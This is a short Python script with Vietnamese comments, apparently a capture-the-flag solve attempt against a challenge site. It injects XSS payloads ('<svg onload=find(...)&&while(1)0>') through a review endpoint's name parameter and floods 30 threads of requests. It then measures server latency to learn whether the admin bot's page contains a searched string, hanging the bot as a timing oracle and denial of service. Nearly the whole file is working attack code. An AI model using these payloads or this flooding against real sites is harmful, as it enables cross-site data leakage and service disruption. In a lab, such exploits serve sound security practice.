import requests
import time
import threading
from urllib.parse import quote

# CẤU HÌNH
BASE_URL = "https://shadow-fight.ctf.prgy.in"
# Tăng số luồng lên để đảm bảo server bị ngộp nếu bot treo
FLOOD_COUNT = 30 

def send_dos_request(payload):
    try:
        # Timeout cực ngắn (0.5s) để bắn và quên
        requests.get(f"{BASE_URL}/review?name={quote(payload)}&avatar=https://picsum.photos/200", timeout=0.5)
    except:
        pass

def check_latency():
    start = time.time()
    try:
        # Request kiểm tra sức khỏe server
        requests.get(f"{BASE_URL}/review?name=check&avatar=https://picsum.photos/200", timeout=10)
        return time.time() - start
    except requests.exceptions.ReadTimeout:
        return 99.0 # Timeout
    except:
        return 0.0

print("[*] Sanity Check V2: Thử nghiệm với Wrap Around (0,0,1)...")

# Payload 1: Tìm 'Name' với tham số wrapAround=1
# Nếu tìm thấy -> Treo cứng
payload_hit = "<svg onload=find('Name',0,0,1)&&while(1)0>"

# Payload 2: Tìm chuỗi vô nghĩa
payload_miss = "<svg onload=find('KhongCo',0,0,1)&&while(1)0>"

for name, p in [("TEST HIT (Tìm 'Name')", payload_hit), ("TEST MISS (Tìm 'KhongCo')", payload_miss)]:
    print(f"\n--- {name} ---")
    print(f"Payload: {p}")
    
    # 1. Bắn Flood
    threads = []
    for _ in range(FLOOD_COUNT):
        t = threading.Thread(target=send_dos_request, args=(p,))
        threads.append(t)
        t.start()
    for t in threads: t.join()
    
    # 2. Chờ bot xử lý
    time.sleep(2)
    
    # 3. Đo Latency
    lat = check_latency()
    print(f"Latency đo được: {lat:.2f}s")
    
    if lat > 3.0:
        print("=> KẾT QUẢ: TREO THÀNH CÔNG! (Đã tìm ra cách DoS)")
    else:
        print("=> KẾT QUẢ: Server vẫn nhanh (Bot có thể là Async hoặc đã chặn loop)")